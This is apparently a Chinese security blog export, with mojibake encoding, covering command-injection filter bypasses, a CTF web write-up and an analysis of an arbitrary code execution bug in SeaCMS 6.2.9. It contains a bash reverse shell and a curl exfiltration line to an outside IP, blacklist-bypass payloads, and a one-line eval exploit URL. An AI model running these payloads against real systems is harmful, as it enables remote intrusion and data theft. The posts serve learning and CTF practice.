0000000 040 011 012 012        //ç©ºæ ¼ tab æ¢è¡Œ
0000004</code></pre>
<p>payloadï¼š</p>
<pre><code>root@test:/home/test# cat$&#123;IFS&#125;flag
flagaaaaaaaaaa</code></pre>
<pre><code>root@test:/home/test# cat$IFS$1flag    //å¦‚æœè¿‡æ»¤äº†&#123;&#125;
flagaaaaaaaaaa</code></pre>
<h3 id="2-é‡å®šå‘ç¬¦"><a href="#2-é‡å®šå‘ç¬¦" class="headerlink" title="2.é‡å®šå‘ç¬¦"></a>2.é‡å®šå‘ç¬¦</h3><blockquote>
<p>æ–‡ä»¶æè¿°ç¬¦æ˜¯ä¸å·²æ‰“å¼€æ–‡ä»¶æˆ–è®¾å¤‡ç›¸å…³è”çš„æ•´æ•°ï¼Œå®ƒä»¬ä¿æŒå’Œå·²æ‰“å¼€æ–‡ä»¶æˆ–è®¾å¤‡çš„å…³è”ã€‚æœ€ä¸ºå¸¸è§çš„æ–‡ä»¶æè¿°ç¬¦æ˜¯stdinã€stdoutå’Œstderrï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯0ã€1ã€2ï¼Œæ˜¯ç³»ç»Ÿä¿ç•™çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œåˆ†åˆ«å¯¹åº”æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯ã€‚å¯¹äºstdinï¼Œstdoutå’Œstderré‡å®šå‘ä¸€èˆ¬é‡‡ç”¨çš„æ“ä½œç¬¦ä¸»è¦æœ‰&lt;ã€&gt;å’Œ&gt;&gt;,åœ¨æ²¡æœ‰æŒ‡å®šçš„å…·ä½“æ–‡ä»¶æ“ä½œç¬¦çš„æƒ…å†µä¸‹ï¼Œç¼ºçœæ˜¯è¿™æ ·çš„ï¼šcommand &lt; file.txtç›¸å½“äºcommand 0&lt; file.txtï¼Œä¹Ÿå°±æ˜¯è¯´é»˜è®¤æ˜¯å°†æ–‡ä»¶é‡å®šå‘åˆ°æ–‡ä»¶æè¿°ç¬¦0.</p>
</blockquote>
<p>Payload:</p>
<pre><code>root@test:/home/test# cat&lt;flag
flagaaaaaaaaaa</code></pre>
<h2 id="ç»•è¿‡é»‘åå•"><a href="#ç»•è¿‡é»‘åå•" class="headerlink" title="ç»•è¿‡é»‘åå•"></a>ç»•è¿‡é»‘åå•</h2><h3 id="1-æ‹¼æ¥"><a href="#1-æ‹¼æ¥" class="headerlink" title="1.æ‹¼æ¥"></a>1.æ‹¼æ¥</h3><p>Payload:</p>
<pre><code>root@test:/home/test# a=c;b=at;c=flag;$a$b $c
flagaaaaaaaaaa</code></pre>
<h3 id="2-åˆ©ç”¨ç³»ç»Ÿç¯å¢ƒå˜é‡"><a href="#2-åˆ©ç”¨ç³»ç»Ÿç¯å¢ƒå˜é‡" class="headerlink" title="2.åˆ©ç”¨ç³»ç»Ÿç¯å¢ƒå˜é‡"></a>2.åˆ©ç”¨ç³»ç»Ÿç¯å¢ƒå˜é‡</h3><pre><code>root@test:/home/test# echo $&#123;SHELLOPTS&#125;
braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor</code></pre>
<p>payloadï¼š</p>
<pre><code>root@test:/home/test# $&#123;SHELLOPTS:3:1&#125;$&#123;SHELLOPTS:2:1&#125;$&#123;SHELLOPTS:29:1&#125; flag
flagaaaaaaaaaa</code></pre>
<h3 id="3-base64"><a href="#3-base64" class="headerlink" title="3.base64"></a>3.base64</h3><p>Payload:</p>
<pre><code>root@test:/home/test# `echo &quot;Y2F0IGZsYWc=&quot;|base64 -d`    //åå¼•å·
flagaaaaaaaaaa</code></pre>
<p>or</p>
<pre><code>root@test:/home/test# echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash    // |è¿æ¥
flagaaaaaaaaaa</code></pre>
<h3 id="4-å•-åŒå¼•å·"><a href="#4-å•-åŒå¼•å·" class="headerlink" title="4.å•/åŒå¼•å·"></a>4.å•/åŒå¼•å·</h3><p>payloadï¼š</p>
<pre><code>root@test:/home/test# ca&quot;&quot;t fl&quot;&quot;ag
flagaaaaaaaaaa
root@test:/home/test# ca&quot;&quot;t fl&#39;&#39;ag
flagaaaaaaaaaa
root@test:/home/test# ca&#39;&#39;t fl&#39;&#39;ag
flagaaaaaaaaaa</code></pre>
<h3 id="5-åæ–œæ "><a href="#5-åæ–œæ " class="headerlink" title="5.åæ–œæ \"></a>5.åæ–œæ \</h3><p>Payload:</p>
<pre><code>root@test:/home/test# ca\t fla\g
flagaaaaaaaaaa</code></pre>
<h2 id="æ— å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œ"><a href="#æ— å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="æ— å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œ"></a>æ— å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œ</h2><h3 id="1-bashåå¼¹shell"><a href="#1-bashåå¼¹shell" class="headerlink" title="1.bashåå¼¹shell"></a>1.bashåå¼¹shell</h3><pre><code>|bash -i &gt;&amp; /dev/tcp/192.168.211.212/8080 0&gt;&amp;1</code></pre>
<h3 id="2-curl"><a href="#2-curl" class="headerlink" title="2.curl"></a>2.curl</h3><pre><code>|curl 192.168.211.212:8080/?a=`ls |head -n 3|tail -n 1`</code></pre>
]]></content>
      <categories>
        <category>websec</category>
      </categories>
      <tags>
        <tag>ç»•è¿‡</tag>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>æ•´ç†</title>
    <url>/2017/03/04/zheng-li/</url>
    <content><![CDATA[<h1 id="æ•´ç†ï¼ˆwebï¼‰"><a href="#æ•´ç†ï¼ˆwebï¼‰" class="headerlink" title="æ•´ç†ï¼ˆwebï¼‰"></a>æ•´ç†ï¼ˆwebï¼‰</h1><h3 id="0X01ï¼ˆç­¾åˆ°é¢˜ï¼‰"><a href="#0X01ï¼ˆç­¾åˆ°é¢˜ï¼‰" class="headerlink" title="0X01ï¼ˆç­¾åˆ°é¢˜ï¼‰"></a>0X01ï¼ˆç­¾åˆ°é¢˜ï¼‰</h3><p><a href="http://chinalover.sinaapp.com/web1/">é“¾æ¥</a></p>
<p>å³é”®çœ‹æºç ï¼Œå¾—åˆ°flagã€‚</p>
<h3 id="0X02ï¼ˆmd5-collisionï¼‰"><a href="#0X02ï¼ˆmd5-collisionï¼‰" class="headerlink" title="0X02ï¼ˆmd5 collisionï¼‰"></a>0X02ï¼ˆmd5 collisionï¼‰</h3><p><a href="http://115.28.150.176/md5/index.php">é“¾æ¥</a></p>
<p>æºç ï¼š</p>
<a id="more"></a>

<pre><code>&lt;?php
$md51 = md5(&#39;QNKCDZO&#39;);
$a = @$_GET[&#39;a&#39;];
$md52 = @md5($a);
if(isset($a))&#123;
if ($a != &#39;QNKCDZO&#39; &amp;&amp; $md51 == $md52) &#123;
    echo &quot;nctf&#123;*****************&#125;&quot;;
&#125; else &#123;
    echo &quot;false!!!&quot;;
&#125;&#125;
else&#123;echo &quot;please input a&quot;;&#125;
?&gt;</code></pre>
<p>æ ¹æ®ç»™å‡ºçš„æºç çš„æ„æ€ï¼Œè¦æäº¤çš„aä¸ç­‰äºQNKCDZOï¼Œè¿˜è¦æ»¡è¶³<code> $md51 == $md52</code>ï¼Œè¿™é‡Œä¸æ˜¯è¦md5å€¼å®Œå…¨ä¸€æ ·ï¼Œå› ä¸ºæ¯”è¾ƒæ—¶ç”¨çš„æ˜¯æ¾æ•£æ¯”è¾ƒ<code>==</code>ï¼ŒQNKCDZOçš„md5å€¼ä¸º<code>0e830400451993494058024219903391</code>,è¿™é‡Œå› ä¸ºæ˜¯==çš„æ¯”è¾ƒåªæ¯”è¾ƒä¸¤ä¸ªæ“ä½œæ•°çš„â€œå€¼â€æ˜¯å¦ç›¸ç­‰ï¼Œè€Œæ— è®ºç±»å‹æ˜¯å¦ç›¸åŒã€‚å¦‚æœæ¯”è¾ƒä¸€ä¸ªæ•´æ•°å’Œå­—ç¬¦ä¸²ï¼Œåˆ™å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢ä¸ºæ•´æ•°ã€‚å¦‚æœæ¯”è¾ƒä¸¤ä¸ªæ•°å­—å­—ç¬¦ä¸²ï¼Œåˆ™ä½œä¸ºæ•´æ•°æ¯”è¾ƒã€‚å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•°æ—¶ï¼Œæ˜¯ä»å·¦åˆ°å³ï¼Œç›´åˆ°é‡åˆ°éæ•°å­—å­—ç¬¦ä¸ºæ­¢ã€‚ä¹Ÿå°±æ˜¯è¯´ â€˜123abc456â€™ ä¼šè¢«è½¬æ¢æˆ 123ï¼Œè€Œä¸æ˜¯ 123456ã€‚å¦å¤–å­—ç¬¦ä¸²å¼€å§‹çš„ç©ºæ ¼ä¼šè¢«å¿½ç•¥ï¼Œæ¯”å¦‚ â€˜Â Â  234abcâ€™ è½¬æ¢ä¸º 234ã€‚è¿™é‡Œå®ƒçš„md5ç¬¬äºŒä½æ˜¯eï¼Œä¹Ÿå°±æ˜¯æ¯”è¾ƒåªæ¯”è¾ƒç¬¬ä¸€ä¸ªæ•°å­—0ï¼Œæ‰¾ä¸€ä¸ªmd5å€¼ç¬¦åˆç¬¬ä¸€ä½ä¸º0ï¼Œç¬¬äºŒä½ä¸ºå­—æ¯çš„å°±è¡Œã€‚</p>
<h5 id="çŸ¥è¯†ç‚¹ï¼š"><a href="#çŸ¥è¯†ç‚¹ï¼š" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h5><ol>
<li><p>PHP</p>
</li>
<li><p>æ¾æ•£æ¯”è¾ƒ</p>
</li>
</ol>
<h3 id="0X03ï¼ˆç­¾åˆ°2ï¼‰"><a href="#0X03ï¼ˆç­¾åˆ°2ï¼‰" class="headerlink" title="0X03ï¼ˆç­¾åˆ°2ï¼‰"></a>0X03ï¼ˆç­¾åˆ°2ï¼‰</h3><p><a href="http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php">é“¾æ¥</a></p>
<p>æºç ï¼š</p>
<pre><code>&lt;html&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
å°šæœªç™»å½•æˆ–å£ä»¤é”™è¯¯&lt;form action=&quot;./index.php&quot; method=&quot;post&quot;&gt;
    &lt;p&gt;è¾“å…¥æ¡†ï¼š&lt;input type=&quot;password&quot; value=&quot;&quot; name=&quot;text1&quot; maxlength=&quot;10&quot;&gt;&lt;br&gt;
    è¯·è¾“å…¥å£ä»¤ï¼šzhimakaimen
    &lt;input type=&quot;submit&quot; value=&quot;å¼€é—¨&quot;&gt;
&lt;/form&gt;

&lt;/html&gt;</code></pre>
<p>è®©è¾“å…¥<code>zhimakaimen</code>ï¼Œæ³¨æ„åˆ°<code>maxlength=&quot;10&quot;</code>ï¼Œæ‰€ä»¥é€šä¸è¿‡ï¼ŒF12ä¿®æ”¹ä¸€ä¸‹å°±è¡Œã€‚</p>
<h3 id="0x04-è¿™é¢˜ä¸æ˜¯WEB"><a href="#0x04-è¿™é¢˜ä¸æ˜¯WEB" class="headerlink" title="0x04(è¿™é¢˜ä¸æ˜¯WEB)"></a>0x04(è¿™é¢˜ä¸æ˜¯WEB)</h3><p><a href="http://chinalover.sinaapp.com/web2/index.html">é“¾æ¥</a></p>
<p>è®²çœŸï¼Œè¿™é¢˜çœŸä¸æ˜¯webï¼ŒæŠŠå›¾ç‰‡ä¿å­˜åˆ°æœ¬åœ°ï¼Œè®°äº‹æœ¬æ‰“å¼€å¾—åˆ°flagï¼Œç®—æ˜¯éšå†™ã€‚==ã€‚</p>
<h3 id="0X05-å•èº«äºŒåå¹´"><a href="#0X05-å•èº«äºŒåå¹´" class="headerlink" title="0X05(å•èº«äºŒåå¹´)"></a>0X05(å•èº«äºŒåå¹´)</h3><p><a href="http://chinalover.sinaapp.com/web8/">é“¾æ¥</a></p>
<p>burp suiteæ‹¦æˆªå‘åˆ°repeaterï¼ŒæŸ¥çœ‹å“åº”ï¼Œflagå°±åœ¨é‡Œé¢ã€‚</p>
<pre><code>&lt;script&gt;window.location=&quot;./no_key_is_here_forever.php&quot;; &lt;/script&gt;
key is : nctf&#123;yougotit_script_now&#125;</code></pre>
<p>è·³è½¬è¿‡ç¨‹åœ°å€æ éšçº¦çœ‹åˆ°äº†search.phpï¼Œå°±æ€€ç–‘æœ‰å…¶ä»–ç½‘é¡µï¼Œä½†æ˜¯ä¸€é—ªè€Œè¿‡ï¼Œæ‰€ä»¥burpæˆªä½çœ‹ã€‚ä¸Šé¢æ˜¯searché‚£ä¸ªç½‘é¡µçš„æºç ã€‚å¯ä»¥çœ‹å‡ºç›´æ¥é‡å®šå‘åˆ°<code>no_key_is_here_forever.php</code>äº†ï¼Œflagä¹Ÿå°±åœ¨é‡Œé¢ã€‚</p>
<blockquote>
<p><em>window.location</em>Â å¯¹è±¡ç”¨äºè·å¾—å½“å‰é¡µé¢çš„åœ°å€ (URL),å¹¶æŠŠæµè§ˆå™¨é‡å®šå‘åˆ°æ–°çš„é¡µé¢</p>
</blockquote>
<p>çŸ¥è¯†ç‚¹ï¼šburp suitä½¿ç”¨ã€‚</p>
<h3 id="0X06-php-decode"><a href="#0X06-php-decode" class="headerlink" title="0X06(php decode)"></a>0X06(php decode)</h3><p>ç›´æ¥ç»™å‡ºçš„æºç ï¼š</p>
<pre><code>&lt;?php
function CLsI($ZzvSWE) &#123;

    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));

    for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123;

        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);

    &#125;

    return $ZzvSWE;

&#125;eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));?&gt;</code></pre>
<p>è¿™ä¸æ˜¯phpå˜›ï¼Œä¸è¿‡æœ€åeval()å‡½æ•°ç”¨çš„ä¸å¯¹ï¼Œæ”¹æˆechoæ‰èƒ½è¾“å‡ºå•Šã€‚æˆ‘æ˜¯ç›´æ¥æ”¾è™šæ‹Ÿæœºé‡Œé¢è®¿é—®å¾—åˆ°çš„ã€‚åæ¥çŸ¥é“æœ‰åœ¨çº¿phpä»£ç æµ‹è¯•<a href="http://www.135995.com/runcode/php/">è¿™æ˜¯é“¾æ¥</a>ã€‚</p>
<pre><code>eval() å‡½æ•°å¯è®¡ç®—æŸä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶æ‰§è¡Œå…¶ä¸­çš„çš„ JavaScript ä»£ç ã€‚</code></pre>
<p>çŸ¥è¯†ç‚¹ï¼šphp</p>
<h3 id="0X07-å•èº«ä¸€ç™¾å¹´ä¹Ÿæ²¡ç”¨"><a href="#0X07-å•èº«ä¸€ç™¾å¹´ä¹Ÿæ²¡ç”¨" class="headerlink" title="0X07(å•èº«ä¸€ç™¾å¹´ä¹Ÿæ²¡ç”¨)"></a>0X07(å•èº«ä¸€ç™¾å¹´ä¹Ÿæ²¡ç”¨)</h3><p><a href="http://chinalover.sinaapp.com/web9/">é“¾æ¥</a></p>
<p>burpæˆªå–ï¼Œå‘é€repeaterï¼ŒæŸ¥çœ‹å“åº”ã€‚</p>
<p>çŸ¥è¯†ç‚¹ï¼š302é‡å®šå‘ã€‚</p>
<h3 id="0X08-Download"><a href="#0X08-Download" class="headerlink" title="0X08(Download~!)"></a>0X08(Download~!)</h3><p><a href="http://way.nuptzj.cn/web6/">é“¾æ¥</a></p>
<p>æºç :</p>
<pre><code>

&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;title&gt;Game 19&lt;/title&gt;
&lt;link href=&quot;templatemo_style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;templatemo_container&quot;&gt;
    &lt;div id=&quot;templatemo_header&quot;&gt;
        &lt;div id=&quot;website_title&quot;&gt;

        &lt;/div&gt;
    &lt;/div&gt; 

    &lt;div id=&quot;templatemo_menu&quot;&gt;
        &lt;ul&gt;
            &lt;li&gt;&lt;a href=&quot;#&quot; class=&quot;current&quot;&gt;Tips&lt;/a&gt;&lt;/li&gt;
            &lt;li&gt;&lt;b&gt;down&lt;/b&gt;&lt;/li&gt;
        &lt;/ul&gt; 
    &lt;/div&gt;  

    &lt;div id=&quot;templatemo_content_wrapper&quot;&gt;

        &lt;div id=&quot;templatemo_content&quot;&gt;

            &lt;div class=&quot;content_title_01&quot;&gt;å¬ä¼šæ­Œå§&lt;/div&gt;
            &lt;div class=&quot;horizontal_divider_01&quot;&gt;&amp;nbsp;&lt;/div&gt;
            &lt;div class=&quot;cleaner&quot;&gt;&amp;nbsp;&lt;/div&gt;

            &lt;p&gt;ä¸ºäº†è®©å¤§å®¶æ›´è½»æ¾çš„æ¯”èµ›ï¼Œä¸ºå¤§å®¶å‡†å¤‡äº†ä¸¤é¦–æ­Œè®©å¤§å®¶ä¸‹è½½&lt;/p&gt;

            &lt;p&gt;&lt;a href=&quot;download.php?url=eGluZ3hpbmdkaWFuZGVuZy5tcDM=&quot; target=&quot;_blank&quot;&gt;æ˜Ÿæ˜Ÿç‚¹ç¯&lt;/a&gt;&lt;/p&gt;
            &lt;p&gt;&lt;a href=&quot;download.php?url=YnV4aWFuZ3poYW5nZGEubXAz&quot; target=&quot;_blank&quot;&gt;ä¸æƒ³é•¿å¤§&lt;/a&gt;&lt;/p&gt;


             &lt;div class=&quot;cleaner&quot;&gt;&amp;nbsp;&lt;/div&gt;
        &lt;/div&gt;
        &lt;div class=&quot;cleaner&quot;&gt;&amp;nbsp;&lt;/div&gt;
    &lt;/div&gt;

    &lt;div id=&quot;templatemo_footer&quot;&gt;

    &lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>ç‚¹é‚£ä¸¤é¦–æ­Œçš„é“¾æ¥å¯ä»¥ä¸‹è½½ï¼Œçœ‹æºç ï¼Œå‘ç°ä¸‹è½½é“¾æ¥.</p>
<pre><code>&lt;p&gt;&lt;a href=&quot;download.php?url=eGluZ3hpbmdkaWFuZGVuZy5tcDM=&quot; target=&quot;_blank&quot;&gt;æ˜Ÿæ˜Ÿç‚¹ç¯&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;download.php?url=YnV4aWFuZ3poYW5nZGEubXAz&quot; target=&quot;_blank&quot;&gt;ä¸æƒ³é•¿å¤§&lt;/a&gt;&lt;/p&gt;</code></pre>
<p>è¿™é‡Œurl=ï¼Ÿè¯´æ˜äº†ä¸‹è½½çš„ä¸œè¥¿ï¼Œå¯ä»¥å‘ç°æ˜¯base64åŠ å¯†è¿‡çš„ï¼Œå¤åˆ¶åbase64decodeéªŒè¯æ˜¯base64ï¼Œä½†æ˜¯è¦æ”¹ä¸ºä»€ä¹ˆï¼ˆä¸‹è½½ä»€ä¹ˆï¼‰å‘¢ï¼Ÿä»–è¯´äº†æƒ³ä¸‹ä»€ä¹ˆä¸‹ä»€ä¹ˆï¼ŒæŠŠdownload.phpä¸‹è½½ä¸‹æ¥çœ‹çœ‹ï¼ˆæŠŠdownload.phpç»è¿‡base64åŠ å¯†åæ›¿æ¢æ‰åŸæ¥url=åé¢çš„å­—ç¬¦ä¸²ï¼‰ã€‚å¾—åˆ°è¿™ä¸ª</p>
<pre><code>??&lt;?php
error_reporting(0);
include(&quot;hereiskey.php&quot;);
$url=base64_decode($_GET[url]);
if( $url==&quot;hereiskey.php&quot; || $url==&quot;buxiangzhangda.mp3&quot; || $url==&quot;xingxingdiandeng.mp3&quot; || $url==&quot;download.php&quot;)&#123;
    $file_size = filesize($url);
    header ( &quot;Pragma: public&quot; );
    header ( &quot;Cache-Control: must-revalidate, post-check=0, pre-check=0&quot; );
    header ( &quot;Cache-Control: private&quot;, false );
    header ( &quot;Content-Transfer-Encoding: binary&quot; );
    header ( &quot;Content-Type:audio/mpeg MP3&quot;);
    header ( &quot;Content-Length: &quot; . $file_size);
    header ( &quot;Content-Disposition: attachment; filename=&quot;.$url);
    echo(file_get_contents($url));
    exit;
&#125;
else &#123;
    echo &quot;Access Forbidden!&quot;;
&#125;
?&gt;</code></pre>
<p>å‰©ä¸‹çš„ä¸€æ ·æ¥å°±è¡Œäº†ã€‚</p>
<h3 id="0X09-MYSQL"><a href="#0X09-MYSQL" class="headerlink" title="0X09(MYSQL)"></a>0X09(MYSQL)</h3><p><a href="http://chinalover.sinaapp.com/web11/">é“¾æ¥</a></p>
<p>æ ¹æ®æç¤ºæŸ¥çœ‹robots.txtï¼Œå¦‚ä¸‹ï¼š</p>
<pre><code>åˆ«å¤ªå¼€å¿ƒï¼Œflagä¸åœ¨è¿™ï¼Œè¿™ä¸ªæ–‡ä»¶çš„ç”¨é€”ä½ çœ‹å®Œäº†ï¼Ÿ
åœ¨CTFæ¯”èµ›ä¸­ï¼Œè¿™ä¸ªæ–‡ä»¶å¾€å¾€å­˜æ”¾ç€æç¤ºä¿¡æ¯

TIP:sql.php

&lt;?php
if($_GET[id]) &#123;
   mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $id = intval($_GET[id]);
  $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#39;$id&#39;&quot;));
  if ($_GET[id]==1024) &#123;
      echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;
  &#125;
  else&#123;
    echo($query[content]);
  &#125;
&#125;
?&gt;</code></pre>
<p>æ ¹æ®æç¤ºéœ€è¦è®¿é—®sql.phpï¼ŒåŒæ—¶éœ€è¦æä¾›å‚æ•°idã€‚è¿™é‡Œå…³é”®æ˜¯intval()å‡½æ•°ã€‚intval()å°†å˜é‡è½¬æˆæ•´æ•°ç±»å‹ã€‚è€Œä¸”idï¼=1024ï¼Œæ‰€ä»¥1024.1å°±å¯ä»¥äº†ã€‚</p>
<p>çŸ¥è¯†ç‚¹ï¼š</p>
<ol>
<li>robots.txt</li>
<li>intval()å‡½æ•°</li>
</ol>
<p>###0X10()</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>æµ·æ´‹cmsV6.2.9 ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´</title>
    <url>/2018/02/12/hai-yang-cmsv6.2.9-ren-yi-dai-ma-zhi-xing-lou-dong/</url>
    <content><![CDATA[<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><pre><code class="php+HTML">xxx/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[1])</code></pre>
<h1 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h1><p>å…ˆå»search.phpçœ‹ä¸€ä¸‹è¿™å‡ ä¸ªå‚æ•°çš„ä½ç½®(13-31è¡Œ)</p>
<pre><code class="php">$page = (isset($page) &amp;&amp; is_numeric($page)) ? $page : 1;
$searchtype = (isset($searchtype) &amp;&amp; is_numeric($searchtype)) ? $searchtype : -1;
$tid = (isset($tid) &amp;&amp; is_numeric($tid)) ? intval($tid) : 0;
if(!isset($searchword)) $searchword = &#39;&#39;;
$action = $_REQUEST[&#39;action&#39;];
$searchword = RemoveXSS(stripslashes($searchword));
$searchword = addslashes(cn_substr($searchword,20));
if($cfg_notallowstr !=&#39;&#39; &amp;&amp; m_eregi($cfg_notallowstr,$searchword))
&#123;
    ShowMsg(&quot;ä½ çš„æœç´¢å…³é”®å­—ä¸­å­˜åœ¨éæ³•å†…å®¹ï¼Œè¢«ç³»ç»Ÿç¦æ­¢ï¼&quot;,&quot;index.php&quot;,&quot;0&quot;,$cfg_search_time*1000);
    exit();
&#125;
if($searchword==&#39;&#39;&amp;&amp;$searchtype!=5)
&#123;
    ShowMsg(&#39;å…³é”®å­—ä¸èƒ½ä¸ºç©ºï¼&#39;,&#39;index.php&#39;,&#39;0&#39;,$cfg_search_time*1000);
    exit();
&#125;

echoSearchPage();</code></pre>
<p>ä»¤searchtype=5ï¼Œæ»¡è¶³25è¡Œçš„æ¡ä»¶<code>if($searchword==&#39;&#39;&amp;&amp;$searchtype!=5)</code></p>
<p>ç¬¬184è¡Œ</p>
<pre><code class="php">$content=$mainClassObj-&gt;parseIf($content);</code></pre>
<p>è°ƒç”¨äº†å‡½æ•°<code>parseIf()</code>ï¼Œå®šä½å‡½æ•°çœ‹ä¸€ä¸‹åŠŸèƒ½ã€‚ä½äº/include/main.class.phpç¬¬3087è¡Œ</p>
<pre><code class="php">    function parseIf($content)&#123;
        if (strpos($content,&#39;&#123;if:&#39;)=== false)&#123;
        return $content;
        &#125;else&#123;
        $labelRule = buildregx(&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;,&quot;is&quot;);
        $labelRule2=&quot;&#123;elseif&quot;;
        $labelRule3=&quot;&#123;else&#125;&quot;;
        preg_match_all($labelRule,$content,$iar);
        $arlen=count($iar[0]);
        $elseIfFlag=false;
        for($m=0;$m&lt;$arlen;$m++)&#123;
            $strIf=$iar[1][$m];
            $strIf=$this-&gt;parseStrIf($strIf);
            $strThen=$iar[2][$m];
            $strThen=$this-&gt;parseSubIf($strThen);
            if (strpos($strThen,$labelRule2)===false)&#123;
                if (strpos($strThen,$labelRule3)&gt;=0)&#123;
                    $elsearray=explode($labelRule3,$strThen);
                    $strThen1=$elsearray[0];
                    $strElse1=$elsearray[1];
                    @eval(&quot;if(&quot;.$strIf.&quot;)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;);
                    if ($ifFlag)&#123; $content=str_replace($iar[0][$m],$strThen1,$content);&#125; else &#123;$content=str_replace($iar[0][$m],$strElse1,$content);&#125;
                &#125;else&#123;
                @eval(&quot;if(&quot;.$strIf.&quot;) &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;&quot;);
                if ($ifFlag) $content=str_replace($iar[0][$m],$strThen,$content); else $content=str_replace($iar[0][$m],&quot;&quot;,$content);&#125;
            &#125;else&#123;
                $elseIfArray=explode($labelRule2,$strThen);
                $elseIfArrayLen=count($elseIfArray);
                $elseIfSubArray=explode($labelRule3,$elseIfArray[$elseIfArrayLen-1]);
                $resultStr=$elseIfSubArray[1];
                $elseIfArraystr0=addslashes($elseIfArray[0]);
                @eval(&quot;if($strIf)&#123;\$resultStr=\&quot;$elseIfArraystr0\&quot;;&#125;&quot;);
                for($elseIfLen=1;$elseIfLen&lt;$elseIfArrayLen;$elseIfLen++)&#123;
                    $strElseIf=getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;);
                    $strElseIf=$this-&gt;parseStrIf($strElseIf);
                    $strElseIfThen=addslashes(getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;));
                    @eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\$resultStr=\&quot;$strElseIfThen\&quot;;&#125;&quot;);
                    @eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\$elseIfFlag=true;&#125;else&#123;\$elseIfFlag=false;&#125;&quot;);
                    if ($elseIfFlag) &#123;break;&#125;
                &#125;
                $strElseIf0=getSubStrByFromAndEnd($elseIfSubArray[0],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;);
                $strElseIfThen0=addslashes(getSubStrByFromAndEnd($elseIfSubArray[0],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;));
                if(strpos($strElseIf0,&#39;==&#39;)===false&amp;&amp;strpos($strElseIf0,&#39;=&#39;)&gt;0)$strElseIf0=str_replace(&#39;=&#39;, &#39;==&#39;, $strElseIf0);
                @eval(&quot;if(&quot;.$strElseIf0.&quot;)&#123;\$resultStr=\&quot;$strElseIfThen0\&quot;;\$elseIfFlag=true;&#125;&quot;);
                $content=str_replace($iar[0][$m],$resultStr,$content);
            &#125;
        &#125;
        return $content;
        &#125;
    &#125;</code></pre>
<p>å¯ä»¥çœ‹åˆ°å‡½æ•°ä¸­æœ‰å¤šå‡º@evalï¼Œå¹¶ä¸”åŒ…å«æœ‰å˜é‡ï¼Œä¸‹é¢æˆ‘ä»¬å°±å¯¹å˜é‡è¿›è¡Œåˆ†æã€‚</p>
<p>ç¬¬3107è¡Œ:<code>@eval(&quot;if(&quot;.$strIf.&quot;)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;);</code></p>
<p>æˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™ä¸ªå˜é‡$strIfæ˜¯æ€ä¹ˆæ¥çš„</p>
<p>ç¬¬3098å’Œmaiå£°æ˜äº†å˜é‡$strIf</p>
<pre><code class="php">            $strIf=$iar[1][$m];
            $strIf=$this-&gt;parseStrIf($strIf);</code></pre>
<p>strifä½œä¸º&amp;iar[1]çš„å…ƒç´ ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¿™ä¸ª&amp;iaræ˜¯å“ªæ¥çš„ï¼Œåœ¨ç¬¬3094è¡Œ</p>
